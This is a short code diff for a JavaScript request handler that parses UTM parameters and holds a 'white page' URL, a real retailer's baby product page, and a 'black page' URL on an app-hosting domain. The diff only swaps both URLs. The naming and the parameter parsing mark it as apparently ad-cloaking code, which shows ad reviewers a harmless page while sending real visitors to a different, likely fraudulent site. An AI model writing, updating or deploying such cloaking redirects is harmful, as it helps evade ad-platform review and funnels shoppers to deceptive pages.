@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://jctoyseurope.com/en/products/silla-de-paseo-plegable-asiento-reclinable";
-    const blackPageURL = "https://casssshlov.lovable.app/";
+    const whitePageURL = "https://www.vertbaudet.com/en/basics-sweatshirt-with-animal-motif-for-babies-navy-blue.htm?ProductId=341012449&FiltreCouleur=0531&qId=f8521f4dcef2007e96d3e9dab917d87b";
+    const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
